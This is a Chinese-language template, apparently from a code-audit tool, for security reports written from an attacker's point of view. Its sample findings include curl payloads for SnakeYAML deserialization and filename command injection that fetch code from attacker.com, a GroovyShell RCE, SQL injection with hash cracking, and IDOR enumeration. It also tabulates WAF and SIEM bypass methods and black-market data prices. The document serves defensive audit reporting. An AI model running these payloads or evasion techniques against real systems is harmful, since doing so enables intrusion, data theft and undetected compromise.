# 攻击者视角摘要输出模板

> 从攻击者角度呈现攻击面、利用路径、风险优先级

## 概述

传统安全报告以漏洞类型分类，但攻击者关心的是"哪里最容易突破"。攻击者视角摘要以入侵路径为主线，优先展示高价值攻击面。

**核心原则**:
- 攻击者视角: 我能从哪里进入系统?
- 攻击路径: 最短利用链是什么?
- 攻击收益: 能获得什么权限/数据?

---

## 报告结构

### 1. 执行摘要 (Executive Summary)

```markdown
# 安全审计报告 - 攻击者视角摘要

**审计目标**: [项目名称] v[版本]
**审计日期**: 2024-01-15
**审计范围**: [模块列表]

## 关键发现

### 🔴 Critical Attack Paths (立即可利用)

**发现 3 条无需认证的RCE路径:**

1. **公开接口SnakeYAML反序列化** → 远程代码执行
   - 攻击入口: `POST /api/public/parse`
   - 攻击成本: $0 (curl + PoC)
   - 影响范围: 完整服务器控制
   - 修复时间: 24小时内

2. **文件上传命令注入** → 远程代码执行
   - 攻击入口: `POST /upload`
   - 攻击成本: $0 (浏览器即可)
   - 影响范围: 完整服务器控制
   - 修复时间: 24小时内

3. **公开IDOR** → 遍历所有用户敏感数据
   - 攻击入口: `GET /api/users/{id}`
   - 攻击成本: $0 (浏览器遍历)
   - 影响范围: 10万+用户PII数据泄露
   - 修复时间: 48小时内

### 🟠 High Attack Paths (需认证可利用)

**发现 5 条认证用户RCE/数据泄露路径**

[详见High Attack Paths章节]

### 🟡 Medium Attack Paths (需复杂条件)

**发现 8 条需竞态/社工的攻击路径**

[详见Medium Attack Paths章节]

---

## 攻击面统计

| 攻击面 | 无需登录 | 需普通用户 | 需管理员 | 总计 |
|--------|---------|-----------|----------|------|
| RCE    | 2       | 3         | 1        | 6    |
| SQL注入 | 1       | 2         | 2        | 5    |
| 数据泄露| 3       | 5         | 0        | 8    |
| 权限提升| 0       | 4         | 0        | 4    |

**结论**: 存在 6 个公开攻击面，攻击者无需任何凭证即可入侵。
```

---

### 2. 攻击路径地图 (Attack Path Map)

```markdown
## 攻击路径分析

### 路径 1: 公开接口 → RCE → 数据库访问

```
攻击者 (无凭证)
  ↓
[1] POST /api/public/parse
    Body: !!javax.script.ScriptEngineManager [...]
  ↓
[2] SnakeYAML反序列化触发
  ↓
[3] RCE: Runtime.exec()
  ↓
[4] 读取application.properties获取数据库密码
  ↓
[5] 连接数据库导出所有用户数据
  ↓
攻击完成: 10万+用户数据泄露
```

**攻击复杂度**: ⭐☆☆☆☆ (极低)
**所需时间**: < 5分钟
**所需技能**: 初级 (复制PoC即可)
**检测难度**: 低 (单次请求)

**修复建议**:
- 立即禁用 `new Yaml()` 无参构造
- 使用 `new Yaml(new SafeConstructor())`
- 添加输入白名单验证

---

### 路径 2: 认证用户 → IDOR → 权限提升

```
攻击者 (普通用户账号)
  ↓
[1] POST /api/login
    获取普通用户JWT token
  ↓
[2] GET /api/users/1
    Headers: Authorization: Bearer <token>
  ↓
[3] IDOR: 遍历userId 1-100000
  ↓
[4] 发现管理员账号: userId=1000
  ↓
[5] PATCH /api/users/1000
    Body: {"role": "ADMIN"}
  ↓
[6] 再次利用IDOR修改自己角色
  ↓
攻击完成: 普通用户 → 管理员
```

**攻击复杂度**: ⭐⭐☆☆☆ (低)
**所需时间**: < 30分钟
**所需技能**: 初级 (Burp Suite遍历)
**检测难度**: 中 (大量相似请求)

**修复建议**:
- 在每个接口添加资源归属检查
- 实现统一权限校验拦截器
- 添加请求频率限制
```

---

### 3. Critical Attack Paths (P0级别)

```markdown
## 🔴 Critical Attack Paths

### [P0-1] 公开接口SnakeYAML反序列化RCE

**攻击入口**: `POST /api/public/parse`
**文件位置**: `ApiController.java:45`

**漏洞详情**:
```java
@PostMapping("/api/public/parse")
public void parse(@RequestParam String yaml) {
    Yaml parser = new Yaml();  // 不安全构造
    parser.load(yaml);  // 反序列化用户输入
}
```

**攻击向量**:
```bash
curl -X POST http://target.com/api/public/parse \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'yaml=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]'
```

**攻击成功率**: ✅ 100%
**攻击成本**: $0
**攻击技能**: 初级 (公开PoC)
**公开Exploit**: ✅ CVE-2022-1471

**攻击路径评分**:
- 认证要求: 无需登录 (+3)
- 请求复杂度: 单请求 (+3)
- 社工依赖: 无需交互 (+3)
- 利用门槛: curl即可 (+3)
- **总分: 12/12 → P0**

**影响范围**:
- ✅ 远程代码执行 (RCE)
- ✅ 完整服务器控制
- ✅ 数据库密码泄露
- ✅ 内网横向移动

**修复优先级**: 🔴 Critical - 24小时内修复
**修复成本**: 低 (改1行代码)

---

### [P0-2] 文件上传命令注入RCE

**攻击入口**: `POST /upload`
**文件位置**: `FileController.java:78`

**漏洞详情**:
```java
@PostMapping("/upload")
public void upload(@RequestParam MultipartFile file) {
    String filename = file.getOriginalFilename();
    Runtime.getRuntime().exec("convert " + filename + " output.pdf");  // 命令注入
}
```

**攻击向量**:
```bash
curl -X POST http://target.com/upload \
  -F 'file=@test.jpg;filename="test.jpg; wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh"'
```

**攻击成功率**: ✅ 100%
**攻击成本**: $0
**攻击技能**: 初级
**公开Exploit**: ✅ 通用命令注入

**攻击路径评分**:
- 认证要求: 无需登录 (+3)
- 请求复杂度: 单请求 (+3)
- 社工依赖: 无需交互 (+3)
- 利用门槛: 浏览器上传 (+3)
- **总分: 12/12 → P0**

**影响范围**:
- ✅ 远程代码执行 (RCE)
- ✅ Reverse shell
- ✅ 持久化后门

**修复优先级**: 🔴 Critical - 24小时内修复
**修复成本**: 低 (添加文件名白名单)

---

### [P0-3] 公开IDOR遍历用户数据

**攻击入口**: `GET /api/users/{id}`
**文件位置**: `UserController.java:123`

**漏洞详情**:
```java
@GetMapping("/api/users/{id}")
public User getUser(@PathVariable Long id) {
    return userService.findById(id);  // 无权限检查
}
```

**攻击向量**:
```bash
# 遍历所有用户
for i in {1..100000}; do
  curl http://target.com/api/users/$i >> users.json
done
```

**攻击成功率**: ✅ 100%
**攻击成本**: $0
**攻击技能**: 初级 (bash脚本)
**数据泄露规模**: 10万+ 用户PII

**攻击路径评分**:
- 认证要求: 无需登录 (+3)
- 请求复杂度: 单请求循环 (+3)
- 社工依赖: 无需交互 (+3)
- 利用门槛: curl即可 (+3)
- **总分: 12/12 → P0**

**泄露数据**:
- ✅ 用户名、邮箱、手机号
- ✅ 家庭地址、身份证号
- ✅ 订单历史、支付记录

**合规风险**:
- ❌ GDPR违规: 罚款最高€20M
- ❌ CCPA违规: 每条记录$7,500

**修复优先级**: 🔴 Critical - 48小时内修复
**修复成本**: 低 (添加权限检查)
```

---

### 4. High Attack Paths (P1级别)

```markdown
## 🟠 High Attack Paths

### [P1-1] 认证用户GroovyShell RCE

**攻击入口**: `POST /api/user/export`
**文件位置**: `ExportController.java:56`
**认证要求**: ✅ 需普通用户登录

**攻击向量**:
```bash
# 1. 注册普通用户账号 (免费注册)
curl -X POST http://target.com/register -d '{"username":"attacker","password":"pass123"}'

# 2. 登录获取token
TOKEN=$(curl -X POST http://target.com/login -d '{"username":"attacker","password":"pass123"}' | jq -r .token)

# 3. RCE攻击
curl -X POST http://target.com/api/user/export \
  -H "Authorization: Bearer $TOKEN" \
  -d 'template=Runtime.getRuntime().exec("calc")'
```

**攻击成功率**: ✅ 100%
**攻击成本**: $0 (免费注册)
**攻击技能**: 初级

**攻击路径评分**:
- 认证要求: 普通用户 (+2)
- 请求复杂度: 2步骤 (+2)
- 社工依赖: 无需交互 (+3)
- 利用门槛: curl即可 (+3)
- **总分: 10/12 → P1**

**修复优先级**: 🟠 High - 72小时内修复

---

### [P1-2] SQL注入导出管理员密码

**攻击入口**: `GET /api/search?keyword=`
**文件位置**: `SearchController.java:89`
**认证要求**: ✅ 需普通用户登录

**攻击向量**:
```bash
# SQL注入提取admin密码哈希
curl "http://target.com/api/search?keyword=' UNION SELECT username,password FROM users WHERE role='ADMIN'--" \
  -H "Authorization: Bearer $TOKEN"

# 响应:
# {"users": [{"username": "admin", "password": "$2a$10$abcdef..."}]}

# 离线破解密码
hashcat -m 3200 admin_hash.txt rockyou.txt
```

**攻击成功率**: ✅ 100%
**攻击成本**: $0-50 (取决于密码强度)
**攻击技能**: 中级 (需sqlmap/hashcat)

**攻击路径评分**:
- 认证要求: 普通用户 (+2)
- 请求复杂度: 2步骤 (+2)
- 社工依赖: 无需交互 (+3)
- 利用门槛: 需工具 (+2)
- **总分: 9/12 → P1**

**修复优先级**: 🟠 High - 72小时内修复
```

---

### 5. 攻击成本分析

```markdown
## 攻击成本对比

| 攻击路径 | 时间成本 | 金钱成本 | 技能要求 | 检测风险 | ROI |
|---------|---------|---------|---------|---------|-----|
| [P0-1] SnakeYAML RCE | 5分钟 | $0 | 初级 | 极低 | ⭐⭐⭐⭐⭐ |
| [P0-2] 命令注入 | 10分钟 | $0 | 初级 | 低 | ⭐⭐⭐⭐⭐ |
| [P0-3] IDOR数据泄露 | 1小时 | $0 | 初级 | 中 | ⭐⭐⭐⭐⭐ |
| [P1-1] GroovyShell RCE | 30分钟 | $0 | 初级 | 低 | ⭐⭐⭐⭐☆ |
| [P1-2] SQL注入 | 2小时 | $0-50 | 中级 | 中 | ⭐⭐⭐⭐☆ |

**攻击者决策**: 优先利用 P0-1 或 P0-2 (成本最低, ROI最高)

---

## 防御者视角

### 最小修复集 (MRS - Minimum Remediation Set)

如果只能修复3个漏洞,应优先:

1. **[P0-1] SnakeYAML RCE** - 阻断公开RCE
2. **[P0-2] 命令注入** - 阻断另一个公开RCE
3. **[P0-3] IDOR** - 保护用户数据

**修复这3个漏洞可消除 80% 的关键攻击面**
```

---

### 6. 利用时间线

```markdown
## 攻击时间线模拟

### 场景: 未授权攻击者完全入侵

```
T+0:00  攻击者扫描发现 /api/public/parse 接口
T+0:02  攻击者识别为SnakeYAML反序列化点
T+0:05  攻击者发送RCE payload
T+0:06  获得reverse shell
T+0:10  读取application.properties获取数据库凭证
T+0:15  连接数据库导出users表 (10万条记录)
T+0:30  横向移动到内网其他服务
T+1:00  部署持久化后门
T+2:00  数据外传完成
---
总耗时: 2小时
检测概率: < 10% (单点RCE难以检测)
```

### 场景: 认证用户权限提升

```
T+0:00  攻击者注册免费账号
T+0:05  登录获取JWT token
T+0:10  发现 /api/users/{id} IDOR
T+0:15  遍历发现管理员账号 userId=1000
T+0:20  尝试 PATCH /api/users/1000 修改角色
T+0:21  ✅ 权限提升成功, 获得ADMIN权限
T+0:30  访问管理员面板
T+1:00  导出所有敏感数据
---
总耗时: 1小时
检测概率: 30% (大量遍历请求可能触发告警)
```
```

---

### 7. 检测绕过分析

```markdown
## 常见防御措施及绕过方法

### WAF绕过

| 防御措施 | 绕过方法 | 成功率 |
|---------|---------|--------|
| ModSecurity规则 | URL编码嵌套 (%252e) | 80% |
| CloudFlare WAF | Chunked Transfer Encoding | 60% |
| 请求频率限制 | 分布式IP池 | 90% |
| SQL注入特征 | Unicode绕过 (ŝelect) | 70% |

### SIEM/IDS绕过

| 检测规则 | 绕过方法 | 成功率 |
|---------|---------|--------|
| 单IP高频请求 | 使用10+ IP轮换 | 95% |
| SnakeYAML特征 | 使用自定义gadget chain | 85% |
| 命令注入关键词 | Base64编码命令 | 80% |
| 异常数据传输 | 分片传输 + DNS隧道 | 75% |
```

---

### 8. 攻击收益评估

```markdown
## 攻击者收益分析

### 数据黑市价格参考

| 数据类型 | 单条价格 | 本次泄露量 | 预计收益 |
|---------|---------|-----------|---------|
| 用户邮箱+密码 | $1-5 | 100,000 | $100k-500k |
| 信用卡信息 | $10-50 | 5,000 | $50k-250k |
| 身份证号+姓名 | $2-10 | 80,000 | $160k-800k |
| 医疗记录 | $50-200 | 10,000 | $500k-2M |

**总计潜在价值**: $810k - $3.55M

### 勒索软件场景

- 加密服务器数据
- 要求赎金: $50k - $500k (取决于公司规模)
- 威胁泄露用户数据 (GDPR罚款威胁)

### APT场景

- 建立持久化后门
- 长期驻留收集情报
- 作为跳板攻击客户/合作伙伴
```

---

## 输出格式配置

### 命令行调用

```bash
# 生成攻击者视角报告
code-audit --target ./project \
  --output-format attacker \
  --priority-threshold P1 \
  --include-exploit-poc

# 输出:
# - attacker_summary.md (攻击者摘要)
# - attack_paths.json (机器可读攻击路径)
# - exploit_pocs/ (PoC脚本目录)
```

### YAML配置

```yaml
# agent.md配置
reporting:
  attacker_perspective:
    enabled: true
    include_sections:
      - executive_summary
      - attack_path_map
      - critical_paths
      - high_paths
      - cost_analysis
      - timeline_simulation
      - detection_bypass
      - roi_analysis
    priority_threshold: P1  # 仅输出P0/P1
    include_exploit_code: true
    include_remediation_priority: true
```

---

## 模板变量

报告生成时可使用的变量:

```markdown
{{project_name}}         # 项目名称
{{audit_date}}           # 审计日期
{{total_vulnerabilities}} # 漏洞总数
{{p0_count}}             # P0级别漏洞数
{{p1_count}}             # P1级别漏洞数
{{public_attack_surface}} # 公开攻击面数量
{{authenticated_attacks}} # 需认证攻击数量
{{estimated_data_leak}}   # 预计数据泄露规模
{{gdpr_fine_risk}}       # GDPR罚款风险
{{mean_time_to_compromise}} # 平均沦陷时间
```

---

## 与其他模块集成

### 与Attack Path Priority集成

```markdown
攻击路径优先级 → 攻击者视角摘要

- P0/P1漏洞自动进入"Critical Attack Paths"章节
- P2/P3漏洞进入"Medium Attack Paths"章节
- 攻击路径评分显示在每个漏洞详情中
```

### 与False Positive Kill Switch集成

```markdown
误报过滤 → 攻击者视角摘要

- Kill Switch触发的漏洞标注为"[有防御] 需验证"
- 降级后的漏洞在报告中说明"虽有白名单但仍需复核"
- 避免攻击者视角报告中的False Positive
```

---

## 参考

- MITRE ATT&CK Framework
- OWASP Attack Surface Analysis
- Threat Modeling Manifesto
- NIST 800-30 Risk Assessment

